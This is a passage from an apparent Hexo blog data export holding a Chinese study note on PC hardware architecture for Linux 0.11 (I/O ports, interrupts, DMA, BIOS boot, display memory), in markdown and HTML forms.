pnp 00:02\n  0458-047f : pnp 00:00\n    0460-047f : iTCO_wdt.2.auto\n  0500-057f : pnp 00:00\n  0680-069f : pnp 00:00\n0cf8-0cff : PCI conf1\n0d00-ffff : PCI Bus 0000:00\n  1000-100f : pnp 00:00\n  164e-164f : pnp 00:00\n  2000-2fff : PCI Bus 0000:01\n    2000-20ff : 0000:01:00.0\n      2000-20ff : r8169\n  3000-303f : 0000:00:02.0\n  3040-305f : 0000:00:1f.3\n  3060-307f : 0000:00:1f.2\n    3060-307f : ahci\n  3080-3087 : 0000:00:1f.2\n    3080-3087 : ahci\n  3088-308f : 0000:00:1f.2\n    3088-308f : ahci\n  3090-3093 : 0000:00:1f.2\n    3090-3093 : ahci\n  3094-3097 : 0000:00:1f.2\n    3094-3097 : ahci\n  4000-4fff : PCI Bus 0000:02\n  fd60-fd63 : pnp 00:00\n  ffff-ffff : pnp 00:00\n    ffff-ffff : pnp 00:00\n```\n## 接口访问控制\n### 轮询\nCPU通过在程序中循环查询制定设备控制器中的状态来判断是否与设备进行数据交换.简单耗费CPU时间,适合任务等待时间极短或必须的情况.\n### 中断\n需要中断控制器的支持,顾名思义,当事件发生后,CPU暂停当前程序转而执行I/O中断处理服务过程,之后视情况才恢复被中断的程序.需要早就填充好中断向量表.效率较高.\n### DMA\n用于I/O设备与系统内存之间进行大批量数据传送,整个过程需要使用专门的DMA控制器来进行而CPU在传输过程中无需插手.结合中断配合效率很高的.\n\n# 存储器\n## 主存储器映射\n![Linux_0.11_Main_Memory.png](/images/Linux_0.11_Main_Memory.png)\n## BIOS\n顾名思义,基本的输入/输出系统,存放在ROM中的系统BIOS主要用于计算机开机执行系统各个部分自检,并建立起操作系统要使用的各种配置表,把处理器和系统其余部分初始化到一个已知的状态,且为DOS等系统提供硬件设备接口服务.除此之外Linux操作系统在运行的时候并不适用BIOS中的功能.当计算机系统上电开机或者按下了机箱上的复位按钮时,CPU捕获到信号后把CS寄存器设置为0xF000,段基址被设置为0xFFFF0000,段长度为64K.而EIP寄存器(32位体系)被设置为0xFFF0,因此线性地址计算得到0xFFFFFFF0,这个是写死的.4G空间最后一个64K(以前的8086分段特性)的最后16字节处,一般安排一条JMP跳转指令跳到BIOS代码中64KB范围内的某一条指令开始执行.由于目前PC/AT微机中的BIOS容量大多有1MB-2MB,并存储在FLASH中,因此为了能够执行或者访问BIOS超过64KB范围并且又远远不在0-1M地址空间中的其他BIOS代码或者数据,BIOS程序首先使用一个成为32位大模式技术把数据段寄存器的访问范围设置为4G.此后,BIOS在执行了一系列硬件检测和初始化操作之后,把与原来PC机兼容的64KB BIOS代码和数据复制到内存低端1M末端的64K处,然后跳转到这个地方并且让CPU进入真正的实地址模式工作.如下图,最后BIOS会从硬盘或者其他块启动设备把操作系统引导程序加载在内存0x7c00处(Intel约定),并跳转到这个地方继续执行引导程序.\n![Linux_0.11_ROM_BIOS.png](/images/Linux_0.11_ROM_BIOS.png)\n## CMOS存储器\n主要用来存放计算机实时时钟信息和系统硬件配置信息,这部分内存通常和实时时钟芯片做在一块集成块中,CMOS内存的地址空间在基本内存地址空间之外,需要用I/O指令来访问.\n\n# 控制器和控制卡\n## 中断控制器\nIBM PC/AT 80X86兼容微机采两片级联的8259A可编程中断控制芯片组成一个中断控制器,Linux在内核初始化会继续重新对8259A进行编程来使得其符合自身的控制.\n![Linux_0.11_interrupt_8259A.png](/images/Linux_0.11_interrupt_8259A.png)\n\n## DMA控制器\n采用两块Intel 8237芯片具有8个独立通道,对页面寄存器端口,(偏移)地址寄存器端口和数据寄存器端口进行设置来启用数据传送.由于DMA寄存器是8位的,而地址和计数值是16位值,因此各自需要发送两次.\n\n## 定时/计数器\n采用Intel 8253/8254来产生精确的计时中断信号,动态内存DRAM刷新电路和主机扬声器音调合成.Linux 0.11对通道0进行设置,使其工作在方式3下,并且每隔10ms发出IRQ0,即内核的工作脉搏,用于定时切换任务及统计系统资源量.\n## 键盘控制器\n采用类Intel 8042芯片对键盘的接通码和断开嘛进行扫描并计算.通过IRQ1引脚向CPU发出中断请求.根据三套扫描码集确定具体键盘字符.(早期的键盘控制器P21引脚控制CPU A21信号线开启大范围寻址)\n## 串行控制卡\nPC常用符合RS-232C标准的串行接口,并使用通用异步收发器控制芯片UART组成的串行控制器来处理串行数据的手法工作.\n## 显示控制\nIBM最早推出的PC机视频系统标准有单色MDA标准和彩色CGA标准以及EGA和VGA标准.以后推出的所有高级显卡(包括现在的AGP显卡)虽然都具有极高的图形处理速度和智能加速处理,但是它们都支持这几种标准.Linux 0.1x操作系统仅仅使用了这几种标准都支持的文本显示方式.\n### MDA显示标准\n仅支持黑白两色,并且只支持独有的文本字符显示方式(BIOS显示方式7).屏幕规格80\\*25(列号x=0..79;行号y=0..24),共可以显示2000字符(难怪在Linux中打开shell默认都是80\\*25).每个字符还带有1个属性字节,因此显示一屏(一帧)内容需要占据4KB字节.其中偶地址字节存放字符代码(ascll),奇地址存放显示属性.MDA卡配置有8KB显存.在PC机内存寻址范围中占用0xb0000开始的8K空间(0xb0000-0xb2000).如果显示屏行数是video\\_num\\_lines=25;列数是video\\_num\\_colums=80,那么位于屏幕列行值x,y处的字符和属性在内存中的位置是:  \n字符字节位置 = 0xb0000 + video\\_num\\_colums\\*2\\*y + x\\*2;\n属性字节位置 = 字符字节位置+1;\n> **注意此处坐标系为从屏幕左上角开始往右为x增大,往下为y增大,均不为负值.**  \n\n\n![Linux_0.11_MDA_Color.png](/images/Linux_0.11_MDA_Color.png)\n\n\n\n### CGA显示标准\nCGA支持7种彩色和图形显示方式(BIOS显示方式0-6).在80列\\*25行的文本字符显示方式下,有单色和16色彩色两种显示方式(BIOS显示方式2-3).CGA卡标配有16K显示内存(占用内存地址范围0xb8000-0xbc000),因此可存放4帧信息,同样,在每一帧4K显存中,偶数地址存字符代码,奇数字节存放显示属性.但是在console.c程序中只使用了其中8K显存(0xb8000-0xba000).字符显示属性定义如下:\n![Linux_0.11_CGA_Color.png](/images/Linux_0.11_CGA_Color.png)\n\n### EGA/VGA显示标准\n![Linux_0.11_EGA_VGA.png](/images/Linux_0.11_EGA_VGA.png)\n\n## 软盘和硬盘控制器\n由于软盘片比较容易遭到损坏(发霉或划伤),因此目前计算机中已经逐渐开始不配置软盘驱动器,取而代之的是用U盘.而硬盘作为相对于比较大容量和每比特信息廉价的外存设备,在PC中仍然大量存在.下面是硬盘的一些工作原理:\n![Linux_0.11_hard_disk1.png](/images/Linux_0.11_hard_disk1.png)\n![Linux_0.11_hard_disk2.png](/images/Linux_0.11_hard_disk2.png)\n\n# 总结\n本章介绍了基于Intel 80X86芯片组的计算机组成结构及各个工作部件的工作原理.便于理解操作系统内核的实现,毕竟软件要根据硬件的框架在铺设的.\n","slug":"Linux内核0-11完全注释-第二章","published":1,"updated":"2016-11-14T02:56:11.024Z","_id":"civhncctr0002g8uauul4xs51","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>微型计算机组成结构</p>\n</blockquote>\n<hr>\n<h1 id=\"传统IBM-PC及其兼容计算机的组成框图\"><a href=\"#传统IBM-PC及其兼容计算机的组成框图\" class=\"headerlink\" title=\"传统IBM PC及其兼容计算机的组成框图\"></a>传统IBM PC及其兼容计算机的组成框图</h1><p>可以看出唯有地址总线是单向的,从CPU发出,指向各种控制器和接口.而数据总线和控制总线需要是双向的是由于数据需要读写和控制信号的发出和捕获.<br><img src=\"/images/Linux_0.11_arch_IBM_Intel.png\" alt=\"Linux_0.11_arch_IBM_Intel\"></p>\n<h1 id=\"现代PC机芯片集框图\"><a href=\"#现代PC机芯片集框图\" class=\"headerlink\" title=\"现代PC机芯片集框图\"></a>现代PC机芯片集框图</h1><p><img src=\"/images/Linux_0.11_modern_PC.png\" alt=\"Linux_0.11_modern_PC.png\"></p>\n<h1 id=\"I-O端口寻址和访问控制方式\"><a href=\"#I-O端口寻址和访问控制方式\" class=\"headerlink\" title=\"I/O端口寻址和访问控制方式\"></a>I/O端口寻址和访问控制方式</h1><h2 id=\"端口编址\"><a href=\"#端口编址\" class=\"headerlink\" title=\"端口编址\"></a>端口编址</h2><p>1 统一编址:把I/O控制器的端口地址归入存储器寻址地址空间范围内.CPU访问一个端口的操作与访问内存的操作一样,不需要特别的指令.硬件工程师或芯片工程师需确定采用何种编址.<br>2 独立编址:把I/O控制器和控制卡的寻址空间单独作为一个独立的地址空间对待,称为I/O地址空间.必须使用特殊指令来操作,例如Intel中的IN和OUT指令.此时引脚接线也不一样.  </p>\n<p>IBM PC采用了两种方案,独立编址部分采用ISA总线结构分配I/O空间为0x000-0x3ff共1024个端口.统一编址部分例如CGA显卡占据存储器空间0xB8000-0xBC000范围,即CPU地址总线发出此范围的地址并向数据总线上按约定写入ascll值及属性即可显示字符了.  </p>\n<h3 id=\"查看I-O地址范围\"><a href=\"#查看I-O地址范围\" class=\"headerlink\" title=\"查看I/O地址范围\"></a>查看I/O地址范围</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\">rutk1t0r@Rutk1t0r:~$ cat /proc/ioports </div><div class=\"line\">0000-0cf7 : PCI Bus 0000:00</div><div class=\"line\">  0000-001f : dma1</div><div class=\"line\">  0020-0021 : pic1</div><div class=\"line\">  0040-0043 : timer0</div><div class=\"line\">  0050-0053 : timer1</div><div class=\"line\">  0060-0060 : keyboard</div><div class=\"line\">  0062-0062 : PNP0C09:00</div><div class=\"line\">    0062-0062 : EC data</div><div class=\"line\">  0064-0064 : keyboard</div><div class=\"line\">  0066-0066 : PNP0C09:00</div><div class=\"line\">    0066-0066 : EC cmd</div><div class=\"line\">  0070-0077 : rtc0</div><div class=\"line\">  0080-008f : dma page reg</div><div class=\"line\">  00a0-00a1 : pic2</div><div class=\"line\">  00c0-00df : dma2</div><div class=\"line\">  00f0-00ff : fpu</div><div class=\"line\">    00f0-00f0 : PNP0C04:00</div><div class=\"line\">  03c0-03df : vesafb</div><div class=\"line\">  0400-0403 : ACPI PM1a_EVT_BLK</div><div class=\"line\">  0404-0405 : ACPI PM1a_CNT_BLK</div><div class=\"line\">  0408-040b : ACPI PM_TMR</div><div class=\"line\">  0410-0415 : ACPI CPU throttle</div><div class=\"line\">  0420-042f : ACPI GPE0_BLK</div><div class=\"line\">  0430-0433 : iTCO_wdt.2.auto</div><div class=\"line\">  0450-0450 : ACPI PM2_CNT_BLK</div><div class=\"line\">  0454-0457 : pnp 00:02</div><div class=\"line\">  0458-047f : pnp 00:00</div><div class=\"line\">    0460-047f : iTCO_wdt.2.auto</div><div class=\"line\">  0500-057f : pnp 00:00</div><div class=\"line\">  0680-069f : pnp 00:00</div><div class=\"line\">0cf8-0cff : PCI conf1</div><div class=\"line\">0d00-ffff : PCI Bus 0000:00</div><div class=\"line\">  1000-100f : pnp 00:00</div><div class=\"line\">  164e-164f : pnp 00:00</div><div class=\"line\">  2000-2fff : PCI Bus 0000:01</div><div class=\"line\">    2000-20ff : 0000:01:00.0</div><div class=\"line\">      2000-20ff : r8169</div><div class=\"line\">  3000-303f : 0000:00:02.0</div><div class=\"line\">  3040-305f : 0000:00:1f.3</div><div class=\"line\">  3060-307f : 0000:00:1f.2</div><div class=\"line\">    3060-307f : ahci</div><div class=\"line\">  3080-3087 : 0000:00:1f.2</div><div class=\"line\">    3080-3087 : ahci</div><div class=\"line\">  3088-308f : 0000:00:1f.2</div><div class=\"line\">    3088-308f : ahci</div><div class=\"line\">  3090-3093 : 0000:00:1f.2</div><div class=\"line\">    3090-3093 : ahci</div><div class=\"line\">  3094-3097 : 0000:00:1f.2</div><div class=\"line\">    3094-3097 : ahci</div><div class=\"line\">  4000-4fff : PCI Bus 0000:02</div><div class=\"line\">  fd60-fd63 : pnp 00:00</div><div class=\"line\">  ffff-ffff : pnp 00:00</div><div class=\"line\">    ffff-ffff : pnp 00:00</div></pre></td></tr></table></figure>\n<h2 id=\"接口访问控制\"><a href=\"#接口访问控制\" class=\"headerlink\" title=\"接口访问控制\"></a>接口访问控制</h2><h3 id=\"轮询\"><a href=\"#轮询\" class=\"headerlink\" title=\"轮询\"></a>轮询</h3><p>CPU通过在程序中循环查询制定设备控制器中的状态来判断是否与设备进行数据交换.简单耗费CPU时间,适合任务等待时间极短或必须的情况.</p>\n<h3 id=\"中断\"><a href=\"#中断\" class=\"headerlink\" title=\"中断\"></a>中断</h3><p>需要中断控制器的支持,顾名思义,当事件发生后,CPU暂停当前程序转而执行I/O中断处理服务过程,之后视情况才恢复被中断的程序.需要早就填充好中断向量表.效率较高.</p>\n<h3 id=\"DMA\"><a href=\"#DMA\" class=\"headerlink\" title=\"DMA\"></a>DMA</h3><p>用于I/O设备与系统内存之间进行大批量数据传送,整个过程需要使用专门的DMA控制器来进行而CPU在传输过程中无需插手.结合中断配合效率很高的.</p>\n<h1 id=\"存储器\"><a href=\"#存储器\" class=\"headerlink\" title=\"存储器\"></a>存储器</h1><h2 id=\"主存储器映射\"><a href=\"#主存储器映射\" class=\"headerlink\" title=\"主存储器映射\"></a>主存储器映射</h2><p><img src=\"/images/Linux_0.11_Main_Memory.png\" alt=\"Linux_0.11_Main_Memory.png\"></p>\n<h2 id=\"BIOS\"><a href=\"#BIOS\" class=\"headerlink\" title=\"BIOS\"></a>BIOS</h2><p>顾名思义,基本的输入/输出系统,存放在ROM中的系统BIOS主要用于计算机开机执行系统各个部分自检,并建立起操作系统要使用的各种配置表,把处理器和系统其余部分初始化到一个已知的状态,且为DOS等系统提供硬件设备接口服务.除此之外Linux操作系统在运行的时候并不适用BIOS中的功能.当计算机系统上电开机或者按下了机箱上的复位按钮时,CPU捕获到信号后把CS寄存器设置为0xF000,段基址被设置为0xFFFF0000,段长度为64K.而EIP寄存器(32位体系)被设置为0xFFF0,因此线性地址计算得到0xFFFFFFF0,这个是写死的.4G空间最后一个64K(以前的8086分段特性)的最后16字节处,一般安排一条JMP跳转指令跳到BIOS代码中64KB范围内的某一条指令开始执行.由于目前PC/AT微机中的BIOS容量大多有1MB-2MB,并存储在FLASH中,因此为了能够执行或者访问BIOS超过64KB范围并且又远远不在0-1M地址空间中的其他BIOS代码或者数据,BIOS程序首先使用一个成为32位大模式技术把数据段寄存器的访问范围设置为4G.此后,BIOS在执行了一系列硬件检测和初始化操作之后,把与原来PC机兼容的64KB BIOS代码和数据复制到内存低端1M末端的64K处,然后跳转到这个地方并且让CPU进入真正的实地址模式工作.如下图,最后BIOS会从硬盘或者其他块启动设备把操作系统引导程序加载在内存0x7c00处(Intel约定),并跳转到这个地方继续执行引导程序.<br><img src=\"/images/Linux_0.11_ROM_BIOS.png\" alt=\"Linux_0.11_ROM_BIOS.png\"></p>\n<h2 id=\"CMOS存储器\"><a href=\"#CMOS存储器\" class=\"headerlink\" title=\"CMOS存储器\"></a>CMOS存储器</h2><p>主要用来存放计算机实时时钟信息和系统硬件配置信息,这部分内存通常和实时时钟芯片做在一块集成块中,CMOS内存的地址空间在基本内存地址空间之外,需要用I/O指令来访问.</p>\n<h1 id=\"控制器和控制卡\"><a href=\"#控制器和控制卡\" class=\"headerlink\" title=\"控制器和控制卡\"></a>控制器和控制卡</h1><h2 id=\"中断控制器\"><a href=\"#中断控制器\" class=\"headerlink\" title=\"中断控制器\"></a>中断控制器</h2><p>IBM PC/AT 80X86兼容微机采两片级联的8259A可编程中断控制芯片组成一个中断控制器,Linux在内核初始化会继续重新对8259A进行编程来使得其符合自身的控制.<br><img src=\"/images/Linux_0.11_interrupt_8259A.png\" alt=\"Linux_0.11_interrupt_8259A.png\"></p>\n<h2 id=\"DMA控制器\"><a href=\"#DMA控制器\" class=\"headerlink\" title=\"DMA控制器\"></a>DMA控制器</h2><p>采用两块Intel 8237芯片具有8个独立通道,对页面寄存器端口,(偏移)地址寄存器端口和数据寄存器端口进行设置来启用数据传送.由于DMA寄存器是8位的,而地址和计数值是16位值,因此各自需要发送两次.</p>\n<h2 id=\"定时-计数器\"><a href=\"#定时-计数器\" class=\"headerlink\" title=\"定时/计数器\"></a>定时/计数器</h2><p>采用Intel 8253/8254来产生精确的计时中断信号,动态内存DRAM刷新电路和主机扬声器音调合成.Linux 0.11对通道0进行设置,使其工作在方式3下,并且每隔10ms发出IRQ0,即内核的工作脉搏,用于定时切换任务及统计系统资源量.</p>\n<h2 id=\"键盘控制器\"><a href=\"#键盘控制器\" class=\"headerlink\" title=\"键盘控制器\"></a>键盘控制器</h2><p>采用类Intel 8042芯片对键盘的接通码和断开嘛进行扫描并计算.通过IRQ1引脚向CPU发出中断请求.根据三套扫描码集确定具体键盘字符.(早期的键盘控制器P21引脚控制CPU A21信号线开启大范围寻址)</p>\n<h2 id=\"串行控制卡\"><a href=\"#串行控制卡\" class=\"headerlink\" title=\"串行控制卡\"></a>串行控制卡</h2><p>PC常用符合RS-232C标准的串行接口,并使用通用异步收发器控制芯片UART组成的串行控制器来处理串行数据的手法工作.</p>\n<h2 id=\"显示控制\"><a href=\"#显示控制\" class=\"headerlink\" title=\"显示控制\"></a>显示控制</h2><p>IBM最早推出的PC机视频系统标准有单色MDA标准和彩色CGA标准以及EGA和VGA标准.以后推出的所有高级显卡(包括现在的AGP显卡)虽然都具有极高的图形处理速度和智能加速处理,但是它们都支持这几种标准.Linux 0.1x操作系统仅仅使用了这几种标准都支持的文本显示方式.</p>\n<h3 id=\"MDA显示标准\"><a href=\"#MDA显示标准\" class=\"headerlink\" title=\"MDA显示标准\"></a>MDA显示标准</h3><p>仅支持黑白两色,并且只支持独有的文本字符显示方式(BIOS显示方式7).屏幕规格80*25(列号x=0..79;行号y=0..24),共可以显示2000字符(难怪在Linux中打开shell默认都是80*25).每个字符还带有1个属性字节,因此显示一屏(一帧)内容需要占据4KB字节.其中偶地址字节存放字符代码(ascll),奇地址存放显示属性.MDA卡配置有8KB显存.在PC机内存寻址范围中占用0xb0000开始的8K空间(0xb0000-0xb2000).如果显示屏行数是video_num_lines=25;列数是video_num_colums=80,那么位于屏幕列行值x,y处的字符和属性在内存中的位置是:<br>字符字节位置 = 0xb0000 + video_num_colums*2*y + x*2;<br>属性字节位置 = 字符字节位置+1;</p>\n<blockquote>\n<p><strong>注意此处坐标系为从屏幕左上角开始往右为x增大,往下为y增大,均不为负值.</strong>  </p>\n</blockquote>\n<p><img src=\"/images/Linux_0.11_MDA_Color.png\" alt=\"Linux_0.11_MDA_Color.png\"></p>\n<h3 id=\"CGA显示标准\"><a href=\"#CGA显示标准\" class=\"headerlink\" title=\"CGA显示标准\"></a>CGA显示标准</h3><p>CGA支持7种彩色和图形显示方式(BIOS显示方式0-6).在80列*25行的文本字符显示方式下,有单色和16色彩色两种显示方式(BIOS显示方式2-3).CGA卡标配有16K显示内存(占用内存地址范围0xb8000-0xbc000),因此可存放4帧信息,同样,在每一帧4K显存中,偶数地址存字符代码,奇数字节存放显示属性.但是在console.c程序中只使用了其中8K显存(0xb8000-0xba000).字符显示属性定义如下:<br><img src=\"/images/Linux_0.11_CGA_Color.png\" alt=\"Linux_0.11_CGA_Color.png\"></p>\n<h3 id=\"EGA-VGA显示标准\"><a href=\"#EGA-VGA显示标准\" class=\"headerlink\" title=\"EGA/VGA显示标准\"></a>EGA/VGA显示标准</h3><p><img src=\"/images/Linux_0.11_EGA_VGA.png\" alt=\"Linux_0.11_EGA_VGA.png\"></p>\n<h2 id=\"软盘和硬盘控制器\"><a href=\"#软盘和硬盘控制器\" class=\"headerlink\" title=\"软盘和硬盘控制器\"></a>软盘和硬盘控制器</h2><p>由于软盘片比较容易遭到损坏(发霉或划伤),因此目前计算机中已经逐渐开始不配置软盘驱动器,取而代之的是用U盘.而硬盘作为相对于比较大容量和每比特信息廉价的外存设备,在PC中仍然大量存在.下面是硬盘的一些工作原理:<br><img src=\"/images/Linux_0.11_hard_disk1.png\" alt=\"Linux_0.11_hard_disk1.png\"><br><img src=\"/images/Linux_0.11_hard_disk2.png\" alt=\"Linux_0.11_hard_disk2.png\"></p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>本章介绍了基于Intel 80X86芯片组的计算机组成结构及各个工作部件的工作原理.便于理解操作系统内核的实现,毕竟软件要根据硬件的框架在铺设的.</p>\n","excerpt":"","more":"<blockquote>\n<p>微型计算机组成结构</p>\n</blockquote>\n<hr>\n<h1 id=\"传统IBM-PC及其兼容计算机的组成框图\"><a href=\"#传统IBM-PC及其兼容计算机的组成框图\" class=\"headerlink\" title=\"传统IBM PC及其兼容计算机的组成框图\"></a>传统IBM PC及其兼容计算机的组成框图</h1><p>可以看出唯有地址总线是单向的,从CPU发出,指向各种控制器和接口.而数据总线和控制总线需要是双向的是由于数据需要读写和控制信号的发出和捕获.<br><img src=\"/images/Linux_0.11_arch_IBM_Intel.png\" alt=\"Linux_0.11_arch_IBM_Intel\"></p>\n<h1 id=\"现代PC机芯片集框图\"><a href=\"#现代PC机芯片集框图\" class=\"headerlink\" title=\"现代PC机芯片集框图\"></a>现代PC机芯片集框图</h1><p><img src=\"/images/Linux_0.11_modern_PC.png\" alt=\"Linux_0.11_modern_PC.png\"></p>\n<h1 id=\"I-O端口寻址和访问控制方式\"><a href=\"#I-O端口寻址和访问控制方式\" class=\"headerlink\" title=\"I/O端口寻址和访问控制方式\"></a>I/O端口寻址和访问控制方式</h1><h2 id=\"端口编址\"><a href=\"#端口编址\" class=\"headerlink\" title=\"端口编址\"></a>端口编址</h2><p>1 统一编址:把I/O控制器的端口地址归入存储器寻址地址空间范围内.CPU访问一个端口的操作与访问内存的操作一样,不需要特别的指令.硬件工程师或芯片工程师需确定采用何种编址.<br>2 独立编址:把I/O控制器和控制卡的寻址空间单独作为一个独立的地址空间对待,称为I/O地址空间.必须使用特殊指令来操作,例如Intel中的IN和OUT指令.此时引脚接线也不一样.  </p>\n<p>IBM PC采用了两种方案,独立编址部分采用ISA总线结构分配I/O空间为0x000-0x3ff共1024个端口.统一编址部分例如CGA显卡占据存储器空间0xB8000-0xBC000范围,即CPU地址总线发出此范围的地址并向数据总线上按约定写入ascll值及属性即可显示字符了.  </p>\n<h3 id=\"查看I-O地址范围\"><a href=\"#查看I-O地址范围\" class=\"headerlink\" title=\"查看I/O地址范围\"></a>查看I/O地址范围</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\">rutk1t0r@Rutk1t0r:~$ cat /proc/ioports </div><div class=\"line\">0000-0cf7 : PCI Bus 0000:00</div><div class=\"line\">  0000-001f : dma1</div><div class=\"line\">  0020-0021 : pic1</div><div class=\"line\">  0040-0043 : timer0</div><div class=\"line\">  0050-0053 : timer1</div><div class=\"line\">  0060-0060 : keyboard</div><div class=\"line\">  0062-0062 : PNP0C09:00</div><div class=\"line\">    0062-0062 : EC data</div><div class=\"line\">  0064-0064 : keyboard</div><div class=\"line\">  0066-0066 : PNP0C09:00</div><div class=\"line\">    0066-0066 : EC cmd</div><div class=\"line\">  0070-0077 : rtc0</div><div class=\"line\">  0080-008f : dma page reg</div><div class=\"line\">  00a0-00a1 : pic2</div><div class=\"line\">  00c0-00df : dma2</div><div class=\"line\">  00f0-00ff : fpu</div><div class=\"line\">    00f0-00f0 : PNP0C04:00</div><div class=\"line\">  03c0-03df : vesafb</div><div class=\"line\">  0400-0403 : ACPI PM1a_EVT_BLK</div><div class=\"line\">  0404-0405 : ACPI PM1a_CNT_BLK</div><div class=\"line\">  0408-040b : ACPI PM_TMR</div><div class=\"line\">  0410-0415 : ACPI CPU throttle</div><div class=\"line\">  0420-042f : ACPI GPE0_BLK</div><div class=\"line\">  0430-0433 : iTCO_wdt.2.auto</div><div class=\"line\">  0450-0450 : ACPI PM2_CNT_BLK</div><div class=\"line\">  0454-0457 : pnp 00:02</div><div class=\"line\">  0458-047f : pnp 00:00</div><div class=\"line\">    0460-047f : iTCO_wdt.2.auto</div><div class=\"line\">  0500-057f : pnp 00:00</div><div class=\"line\">  0680-069f : pnp 00:00</div><div class=\"line\">0cf8-0cff : PCI conf1</div><div class=\"line\">0d00-ffff : PCI Bus 0000:00</div><div class=\"line\">  1000-100f : pnp 00:00</div><div class=\"line\">  164e-164f : pnp 00:00</div><div class=\"line\">  2000-2fff : PCI Bus 0000:01</div><div class=\"line\">    2000-20ff : 0000:01:00.0</div><div class=\"line\">      2000-20ff : r8169</div><div class=\"line\">  3000-303f : 0000:00:02.0</div><div class=\"line\">  3040-305f : 0000:00:1f.3</div><div class=\"line\">  3060-307f : 0000:00:1f.2</div><div class=\"line\">    3060-307f : ahci</div><div class=\"line\">  3080-3087 : 0000:00:1f.2</div><div class=\"line\">    3080-3087 : ahci</div><div class=\"line\">  3088-308f : 0000:00:1f.2</div><div class=\"line\">    3088-308f : ahci</div><div class=\"line\">  3090-3093 : 0000:00:1f.2</div><div class=\"line\">    3090-3093 : ahci</div><div class=\"line\">  3094-3097 : 0000:00:1f.2</div><div class=\"line\">    3094-3097 : ahci</div><div class=\"line\">  4000-4fff : PCI Bus 0000:02</div><div class=\"line\">  fd60-fd63 : pnp 00:00</div><div class=\"line\">  ffff-ffff : pnp 00:00</div><div class=\"line\">    ffff-ffff : pnp 00:00</div></pre></td></tr></table></figure>\n<h2 id=\"接口访问控制\"><a href=\"#接口访问控制\" class=\"headerlink\" title=\"接口访问控制\"></a>接口访问控制</h2><h3 id=\"轮询\"><a href=\"#轮询\" class=\"headerlink\" title=\"轮询\"></a>轮询</h3><p>CPU通过在程序中循环查询制定设备控制器中的状态来判断是否与设备进行数据交换.简单耗费CPU时间,适合任务等待时间极短或必须的情况.</p>\n<h3 id=\"中断\"><a href=\"#中断\" class=\"headerlink\" title=\"中断\"></a>中断</h3><p>需要中断控制器的支持,顾名思义,当事件发生后,CPU暂停当前程序转而执行I/O中断处理服务过程,之后视情况才恢复被中断的程序.需要早就填充好中断向量表.效率较高.</p>\n<h3 id=\"DMA\"><a href=\"#DMA\" class=\"headerlink\" title=\"DMA\"></a>DMA</h3><p>用于I/O设备与系统内存之间进行大批量数据传送,整个过程需要使用专门的DMA控制器来进行而CPU在传输过程中无需插手.结合中断配合效率很高的.</p>\n<h1 id=\"存储器\"><a href=\"#存储器\" class=\"headerlink\" title=\"存储器\"></a>存储器</h1><h2 id=\"主存储器映射\"><a href=\"#主存储器映射\" class=\"headerlink\" title=\"主存储器映射\"></a>主存储器映射</h2><p><img src=\"/images/Linux_0.11_Main_Memory.png\" alt=\"Linux_0.11_Main_Memory.png\"></p>\n<h2 id=\"BIOS\"><a href=\"#BIOS\" class=\"headerlink\" 